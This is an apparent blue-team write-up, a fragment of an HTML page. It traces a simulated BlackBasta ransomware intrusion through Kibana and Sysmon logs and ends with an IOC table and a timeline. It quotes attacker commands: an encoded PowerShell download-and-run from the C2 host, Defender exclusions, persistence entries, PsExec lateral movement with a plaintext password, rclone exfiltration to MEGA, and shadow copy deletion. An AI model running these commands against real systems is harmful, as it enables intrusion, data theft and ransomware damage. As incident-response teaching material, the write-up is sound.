+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#tldr" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>A finance employee at OrionTech (<code>FINANCEES\knixon</code>) downloaded <code>Financial Records.zip</code> from attacker-controlled server <code>54.93.105.22</code> via Microsoft Edge. The extracted <code>Financial Records.xlsm</code> macro executed an encoded PowerShell command that downloaded and ran <code>F6w1S48.vbs</code>, which loaded <code>WindowsUpdaterFX.dll</code> via <code>regsvr32.exe</code>. The DLL added Windows Defender exclusions, established persistence via a registry Run key and a scheduled task, then dropped <code>Pancake.jpg.exe</code> as a C2 backdoor connecting back to <code>54.93.105.22:80</code>. The attacker enumerated the host and domain, scanned the internal subnet, downloaded PsExec64 via bitsadmin, and laterally moved to a second host using <code>financees.local\swhite</code> credentials. From there, <code>C:\clients</code> was archived and exfiltrated to MEGA via rclone, the system was configured to boot into Safe Mode, shadow copies were deleted as SYSTEM, and the final <strong>BlackBasta</strong> ransomware payload <code>6as98v.exe</code> (61/71 VT detections) was deployed.</p>
+
+<h3 class="relative group"><span style="color:red">Initial Access</span>
+    <div id="initial-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#initial-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>I began the investigation in Kibana by filtering for <strong>Sysmon Event ID 15</strong> (FileCreateStreamHash) - an event generated when Windows writes a <code>Zone.Identifier</code> Alternate Data Stream to a downloaded file, recording its internet origin. This is the most reliable starting point for identifying drive-by downloads.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Event ID 15 - Financial Records.zip download"
+    width="828"
+    height="753"
+    src="/blue_team/elk-black-basta/15_hu_cca0dfc76080701d.png"
+    srcset="/blue_team/elk-black-basta/15_hu_cca0dfc76080701d.png 800w, /blue_team/elk-black-basta/15.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/15.png"></figure>
+</p>
+<p>At <strong>2025-03-21 15:08:22</strong> user <code>FINANCEES\knixon</code> downloaded <code>Financial Records.zip</code> through <code>msedge.exe</code>. The <code>winlog.event_data.Contents</code> field showed <code>ZoneId=3 HostUrl=http://54.93.105.22/Financial%20Records.zip</code>, confirming the file originated from the internet and identifying the attacker&rsquo;s staging server. The file was saved to <code>C:\Users\knixon\Downloads\</code> with SHA256 <code>1CAAEBE93B73AD6C24193EF2D20548FE2E3F82FCDFF2D0B4A09211B61ADC1F6C</code>.</p>
+
+<h3 class="relative group"><span style="color:red">Execution Chain</span>
+    <div id="execution-chain" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#execution-chain" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group"><span style="color:red">Excel Macro</span>
+    <div id="excel-macro" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#excel-macro" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>At <strong>15:09:03</strong> the user extracted and opened <code>Financial Records.xlsm</code> (SHA256: <code>030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15</code>). The macro designated itself as a trusted document by writing to the Excel security registry key:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">HKU\S-1-5-21-3865674213-28386648-2675066931-1120\SOFTWARE\Microsoft\Office\16.0\Excel\Security\Trusted Documents\TrustRecords\%USERPROFILE%/Downloads/Financial%20Records.xlsm</span></span></code></pre></div></div>
+<p>This self-trust registration suppresses the macro security warning on subsequent opens. At <strong>15:09:32</strong> the macro spawned <code>powershell.exe</code> with <code>-ExecutionPolicy Bypass -W Hidden -EncodedCommand</code> - the Hidden window flag and base64-encoded command are standard obfuscation techniques used to hide malicious script content from casual inspection.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="PowerShell encoded command"
+    width="1297"
+    height="438"
+    src="/blue_team/elk-black-basta/powershell_hu_82b18a67f86a9303.png"
+    srcset="/blue_team/elk-black-basta/powershell_hu_82b18a67f86a9303.png 800w, /blue_team/elk-black-basta/powershell_hu_be5813d11e7ec62b.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/powershell.png"></figure>
+</p>
+<p>Decoding the base64 payload revealed:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s1">&#39;http://54.93.105.22/F6w1S48.vbs&#39;</span> <span class="n">-OutFile</span> <span class="s2">&#34;</span><span class="nv">$env:LOCALAPPDATA</span><span class="s2">\Temp\F6w1S48.vbs&#34;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;</span><span class="nv">$env:LOCALAPPDATA</span><span class="s2">\Temp\F6w1S48.vbs&#34;</span></span></span></code></pre></div></div>
+<p>The macro downloaded a VBScript from the C2 server and immediately executed it in the same command.</p>
+
+<h4 class="relative group"><span style="color:red">VBS and DLL Loading</span>
+    <div id="vbs-and-dll-loading" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#vbs-and-dll-loading" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>At <strong>15:15:29</strong> <code>wscript.exe</code> executed <code>F6w1S48.vbs</code> (PID 8732) from the user&rsquo;s Temp directory.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="VBS execution"
+    width="1301"
+    height="506"
+    src="/blue_team/elk-black-basta/vbs_hu_2e2f7fc237faf05.png"
+    srcset="/blue_team/elk-black-basta/vbs_hu_2e2f7fc237faf05.png 800w, /blue_team/elk-black-basta/vbs_hu_d6a8a3c517f5efe7.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/vbs.png"></figure>
+</p>
+<p>The script invoked <code>regsvr32.exe /s C:\Users\knixon\AppData\Local\Temp\WindowsUpdaterFX.dll</code> (PID 8592). <strong>regsvr32</strong> is a legitimate Windows binary used to register COM DLLs - abusing it to load a malicious DLL is a well-known LOLBin technique (T1218.010) that bypasses application whitelisting since the host process is a signed Microsoft binary. The <code>/s</code> flag suppresses the confirmation dialog.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="DLL loading via regsvr32"
+    width="1302"
+    height="314"
+    src="/blue_team/elk-black-basta/dll_hu_ceef819b11e61a0b.png"
+    srcset="/blue_team/elk-black-basta/dll_hu_ceef819b11e61a0b.png 800w, /blue_team/elk-black-basta/dll_hu_a650ef2d76cd5e71.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/dll.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">Persistence and Defense Evasion</span>
+    <div id="persistence-and-defense-evasion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#persistence-and-defense-evasion" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Within the same second at <strong>15:15</strong>, <code>WindowsUpdaterFX.dll</code> (MD5: <code>735AB5713DB79516CF350265FA7574E5</code>) executed a series of commands. It added three Windows Defender exclusion paths to prevent detection of its artifacts:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&#34;C:\ProgramData\Microsoft\ssh&#34;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&#34;%APPDATA%/Microsoft&#34;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&#34;%LOCALAPPDATA%/Temp&#34;</span></span></span></code></pre></div></div>
+<p>It then wrote a registry Run key to maintain persistence across user logons:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater = wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs</span></span></code></pre></div></div>
+<p>A second persistence mechanism was established via a scheduled task configured to execute as SYSTEM on every logon:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">schtasks /Create /RU &#34;NT AUTHORITY\SYSTEM&#34; /SC ONLOGON /TN &#34;WiindowsUpdate&#34;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  /TR &#34;C:\Windows\System32\regsvr32.exe /s %%localappdata%%\Temp\WindowsUpdaterFX.dll&#34;</span></span></code></pre></div></div>
+<p>The task name <code>WiindowsUpdate</code> - with a double <code>i</code> - is designed to visually blend with legitimate Windows Update tasks.</p>
+
+<h4 class="relative group"><span style="color:red">Dropper and C2 Backdoor</span>
+    <div id="dropper-and-c2-backdoor" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#dropper-and-c2-backdoor" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The DLL created <code>C:\Users\knixon\AppData\Local\Temp\Pancake.jpg.exe</code> - the double extension <code>.jpg.exe</code> is a masquerading technique exploiting the Windows default of hiding known file extensions, making the binary appear as an image.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Pancake.jpg.exe FileCreate"
+    width="1297"
+    height="554"
+    src="/blue_team/elk-black-basta/c2_file_hu_6c05b2a26a9d7da1.png"
+    srcset="/blue_team/elk-black-basta/c2_file_hu_6c05b2a26a9d7da1.png 800w, /blue_team/elk-black-basta/c2_file_hu_a8e3fab1ebe9ebf.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/c2_file.png"></figure>
+</p>
+<p>It then launched the binary via <code>Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe</code>. The process (PID 10292) immediately established an outbound connection from <code>10.10.11.29</code> to <code>54.93.105.22</code> over <strong>port 80</strong>, confirming its role as a C2 beacon.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="C2 network connection"
+    width="1303"
+    height="387"
+    src="/blue_team/elk-black-basta/ip_hu_d9c28c18e3b39261.png"
+    srcset="/blue_team/elk-black-basta/ip_hu_d9c28c18e3b39261.png 800w, /blue_team/elk-black-basta/ip_hu_f0d88e137ca7cf1.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/ip.png"></figure>
+</p>
+
+<h3 class="relative group"><span style="color:red">Discovery and Reconnaissance</span>
+    <div id="discovery-and-reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#discovery-and-reconnaissance" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group"><span style="color:red">Host Enumeration</span>
+    <div id="host-enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#host-enumeration" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>With the C2 channel active, the attacker issued discovery commands through <code>Pancake.jpg.exe</code> (PID 10292) spawning child <code>cmd.exe</code> processes at roughly one-minute intervals.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Post-exploitation enumeration"
+    width="1303"
+    height="428"
+    src="/blue_team/elk-black-basta/enum_hu_7bed8cb3b1e10ded.png"
+    srcset="/blue_team/elk-black-basta/enum_hu_7bed8cb3b1e10ded.png 800w, /blue_team/elk-black-basta/enum_hu_6fa67dcb5af9f44c.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/enum.png"></figure>
+</p>
+<p>At <strong>15:17:41</strong> <code>whoami</code> identified the current user context. At <strong>15:18:41</strong> <code>ipconfig /all</code> mapped the network configuration. At <strong>15:20:42</strong> <code>systeminfo</code> retrieved OS version and patch level. At <strong>15:21:46</strong> <code>net group &quot;domain admins&quot; /domain</code> and at <strong>15:22:46</strong> <code>net localgroup administrators</code> enumerated privileged accounts - both are standard T1087 (Account Discovery) techniques used to identify high-value lateral movement targets.</p>
+
+<h4 class="relative group"><span style="color:red">Network Scanning and Tool Staging</span>
+    <div id="network-scanning-and-tool-staging" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#network-scanning-and-tool-staging" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>At <strong>15:42</strong> the attacker deployed <code>netscan.exe</code> to scan the internal subnet <code>10.10.11.1-10.10.255.255</code> for live hosts and open services. To enable lateral movement, <code>bitsadmin</code> - another LOLBin - was used to download <code>PsExec64.exe</code> from a GitHub repository into the knixon Temp folder. <strong>PsExec</strong> is a Sysinternals tool that enables remote process execution on other hosts using valid credentials.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Network scan and PsExec download"
+    width="1059"
+    height="213"
+    src="/blue_team/elk-black-basta/lat_hu_57ae5390a1add500.png"
+    srcset="/blue_team/elk-black-basta/lat_hu_57ae5390a1add500.png 800w, /blue_team/elk-black-basta/lat.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/lat.png"></figure>
+</p>
+
+<h3 class="relative group"><span style="color:red">Lateral Movement</span>
+    <div id="lateral-movement" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#lateral-movement" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>With <code>PsExec64.exe</code> staged, the attacker used compromised credentials <code>financees.local\swhite</code> with password <code>b&lt;ZITx4h1</code> to authenticate to <code>10.10.11.170</code>. Initial validation commands <code>whoami</code> and <code>hostname</code> confirmed remote execution was working. The attacker then propagated the implant using:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe</span></span></code></pre></div></div>
+<p>The <code>-c -f</code> flags copy and force-overwrite the executable to the remote host, and <code>-s</code> runs it as SYSTEM, giving the attacker the highest privilege level on the domain controller.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="PsExec lateral movement"
+    width="1056"
+    height="416"
+    src="/blue_team/elk-black-basta/swhite_hu_8c8463f1b67b2030.png"
+    srcset="/blue_team/elk-black-basta/swhite_hu_8c8463f1b67b2030.png 800w, /blue_team/elk-black-basta/swhite.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/swhite.png"></figure>
+</p>
+
+<h3 class="relative group"><span style="color:red">Collection and Exfiltration</span>
+    <div id="collection-and-exfiltration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#collection-and-exfiltration" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Operating in the context of <code>swhite</code>, the attacker collected sensitive data by compressing <code>C:\clients</code> into <code>data.zip</code> via <code>Compress-Archive</code>. The archive was then exfiltrated to cloud storage using <code>rclone copy data.zip mega:data</code> - <strong>rclone</strong> is a legitimate cloud sync utility frequently abused for data exfiltration (T1567.002) because traffic to MEGA blends with normal cloud storage activity and is rarely blocked.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Collection, exfiltration and payload staging"
+    width="1110"
+    height="454"
+    src="/blue_team/elk-black-basta/ransom_downalod_hu_7572390f40584981.png"
+    srcset="/blue_team/elk-black-basta/ransom_downalod_hu_7572390f40584981.png 800w, /blue_team/elk-black-basta/ransom_downalod.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/ransom_downalod.png"></figure>
+</p>
+
+<h3 class="relative group"><span style="color:red">Pre-Ransomware Staging</span>
+    <div id="pre-ransomware-staging" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#pre-ransomware-staging" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Before deploying the encryptor, the attacker executed <code>bcdedit.exe /set safeboot network</code> to configure the system to reboot into Safe Mode with networking. This technique disables most security software and EDR agents that do not load in Safe Mode, ensuring the ransomware can encrypt files without interference. At <strong>16:47:19</strong> <code>curl</code> downloaded the final payload <code>6as98v.exe</code> from <code>http://54.93.105.22/6as98v.exe</code> into <code>C:\Users\swhite\AppData\Local\Temp\</code>.</p>
+
+<h3 class="relative group"><span style="color:red">Ransomware Execution and Cleanup</span>
+    <div id="ransomware-execution-and-cleanup" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ransomware-execution-and-cleanup" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group"><span style="color:red">Shadow Copy Deletion</span>
+    <div id="shadow-copy-deletion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#shadow-copy-deletion" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Shadow copies were deleted as <code>NT AUTHORITY\SYSTEM</code> using <code>vssadmin.exe delete shadows /all /quiet</code> - a standard ransomware anti-recovery step (T1490) that removes Windows Volume Shadow Copies to prevent file restoration without paying the ransom.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Shadow copy deletion"
+    width="1259"
+    height="249"
+    src="/blue_team/elk-black-basta/shadow_delete_hu_e3e0f339f721e7e7.png"
+    srcset="/blue_team/elk-black-basta/shadow_delete_hu_e3e0f339f721e7e7.png 800w, /blue_team/elk-black-basta/shadow_delete.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/shadow_delete.png"></figure>
+</p>
+
+<h4 class="relative group"><span style="color:red">Ransomware Deployment</span>
+    <div id="ransomware-deployment" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ransomware-deployment" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>At <strong>16:49:19</strong> <code>6as98v.exe</code> (PID 5792, MD5: <code>998022B70D83C6DE68E5BDF94E0F8D71</code>) was executed. VirusTotal confirmed <strong>61/71</strong> vendors flagged this sample as <strong>ransomware.blackbasta/basta</strong> - BlackBasta is a ransomware-as-a-service operation known for double extortion attacks targeting enterprise environments.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="VirusTotal - BlackBasta confirmation"
+    width="1578"
+    height="507"
+    src="/blue_team/elk-black-basta/virustotal_hu_271b7367ce79f62f.png"
+    srcset="/blue_team/elk-black-basta/virustotal_hu_271b7367ce79f62f.png 800w, /blue_team/elk-black-basta/virustotal_hu_7d5fdf1c388eeff3.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/virustotal.png"></figure>
+</p>
+<p>At <strong>16:52:52</strong> and <strong>16:53:30</strong> the attacker ran cleanup commands to remove forensic artifacts from both Temp directories:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="s2">&#34;</span><span class="nv">$env:LOCALAPPDATA</span><span class="s2">\Temp\*&#34;</span> <span class="n">-Recurse</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="s2">&#34;C:\Users\swhite\Appdata\Local\Temp\*&#34;</span> <span class="n">-Recurse</span> <span class="n">-Force</span></span></span></code></pre></div></div>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="Execution and cleanup"
+    width="1103"
+    height="451"
+    src="/blue_team/elk-black-basta/exec_and_cleanup_hu_4320becb9eb68115.png"
+    srcset="/blue_team/elk-black-basta/exec_and_cleanup_hu_4320becb9eb68115.png 800w, /blue_team/elk-black-basta/exec_and_cleanup.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/blue_team/elk-black-basta/exec_and_cleanup.png"></figure>
+</p>
+
+<h3 class="relative group"><span class="hl">IOCs</span>
+    <div id="iocs" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#iocs" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Type</th>
+          <th>Value</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>IP</td>
+          <td><code>54.93.105.22</code></td>
+          <td>Attacker C2 server - payload staging and beaconing</td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td><code>Financial Records.zip</code></td>
+          <td>SHA256: <code>1CAAEBE93B73AD6C24193EF2D20548FE2E3F82FCDFF2D0B4A09211B61ADC1F6C</code></td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td><code>Financial Records.xlsm</code></td>
+          <td>SHA256: <code>030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15</code></td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td><code>F6w1S48.vbs</code></td>
+          <td>VBScript dropper - <code>%LOCALAPPDATA%\Temp\</code></td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td><code>WindowsUpdaterFX.dll</code></td>
+          <td>MD5: <code>735AB5713DB79516CF350265FA7574E5</code> - malicious DLL via regsvr32</td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td><code>Pancake.jpg.exe</code></td>
+          <td>C2 backdoor - <code>%LOCALAPPDATA%\Temp\</code></td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td><code>6as98v.exe</code></td>
+          <td>MD5: <code>998022B70D83C6DE68E5BDF94E0F8D71</code> - BlackBasta ransomware, 61/71 VT</td>
+      </tr>
+      <tr>
+          <td>Registry</td>
+          <td><code>HKCU\...\CurrentVersion\Run\WindowsUpdater</code></td>
+          <td>Persistence Run key</td>
+      </tr>
+      <tr>
+          <td>Task</td>
+          <td><code>WiindowsUpdate</code></td>
+          <td>Scheduled task - runs DLL as SYSTEM on logon</td>
+      </tr>
+      <tr>
+          <td>Account</td>
+          <td><code>FINANCEES\knixon</code></td>
+          <td>Initial compromised account</td>
+      </tr>
+      <tr>
+          <td>Account</td>
+          <td><code>financees.local\swhite</code></td>
+          <td>Lateral movement account, password: <code>b&lt;ZITx4h1</code></td>
+      </tr>
+  </tbody>
+</table>
+
+<h3 class="relative group"><span class="hl">Attack Timeline</span>
+    <div id="attack-timeline" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#attack-timeline" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<pre class="not-prose mermaid">
+%%{init: {'theme': 'base', 'themeVariables': { 'background': '#ffffff', 'mainBkg': '#ffffff', 'primaryTextColor': '#000000', 'lineColor': '#333333', 'clusterBkg': '#ffffff', 'clusterBorder': '#333333'}}}%%
+graph TD
+    classDef default fill:#f9f9f9,stroke:#333,stroke-width:1px,color:#000;
+    classDef access fill:#e1f5fe,stroke:#0277bd,stroke-width:2px,color:#000;
+    classDef exec fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#000;
+    classDef persist fill:#f3e5f5,stroke:#6a1b9a,stroke-width:2px,color:#000;
+    classDef lateral fill:#fff3e0,stroke:#e65100,stroke-width:2px,color:#000;
+    classDef exfil fill:#fce4ec,stroke:#880e4f,stroke-width:2px,color:#000;
+    classDef ransom fill:#b71c1c,stroke:#7f0000,stroke-width:2px,color:#fff;
+
+    A([FINANCEES\knixon<br/>10.10.11.29]):::default --> B[15:08:22 - Edge downloads<br/>Financial Records.zip<br/>from 54.93.105.22]:::access
+    B --> C[15:09:03 - Financial Records.xlsm<br/>macro self-trusts and executes]:::exec
+    C --> D[15:09:32 - Encoded PowerShell<br/>downloads F6w1S48.vbs]:::exec
+    D --> E[15:15:29 - wscript.exe runs F6w1S48.vbs<br/>PID 8732]:::exec
+    E --> F[15:15:34 - regsvr32.exe loads<br/>WindowsUpdaterFX.dll PID 8592]:::exec
+
+    subgraph Persist [Persistence and Defense Evasion]
+        F --> G[15:15 - Defender exclusions added<br/>Run key and WiindowsUpdate task created]:::persist
+        G --> H[Pancake.jpg.exe dropped<br/>C2 beacon to 54.93.105.22:80]:::persist
+    end
+
+    subgraph Discovery [Discovery]
+        H --> I[15:17-15:22 - whoami ipconfig<br/>systeminfo net group domain admins]:::exec
+        I --> J[15:42 - netscan.exe subnet scan<br/>bitsadmin downloads PsExec64.exe]:::exec
+    end
+
+    subgraph Lateral [Lateral Movement]
+        J --> K[PsExec64 with swhite credentials<br/>to 10.10.11.170 and financees.local DC]:::lateral
+    end
+
+    subgraph Exfil [Collection and Exfiltration]
+        K --> L[Compress-Archive C:\clients data.zip<br/>rclone copy data.zip mega:data]:::exfil
+        L --> M[bcdedit /set safeboot network<br/>curl downloads 6as98v.exe]:::exfil
+    end
+
+    subgraph Ransom [Impact]
+        M --> N[vssadmin delete shadows /all /quiet<br/>NT AUTHORITY\SYSTEM]:::ransom
+        N --> O[16:49:19 - BlackBasta executed<br/>PID 5792<br/>MD5: 998022B70D83C6DE68E5BDF94E0F8D71]:::ransom
+        O --> P[16:52-16:53 - PowerShell<br/>Remove-Item Temp cleanup]:::ransom
+    end
+</pre>
+
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_blue_team\ELK-Black Basta\index.md"
+          data-oid-likes="likes_blue_team\ELK-Black Basta\index.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
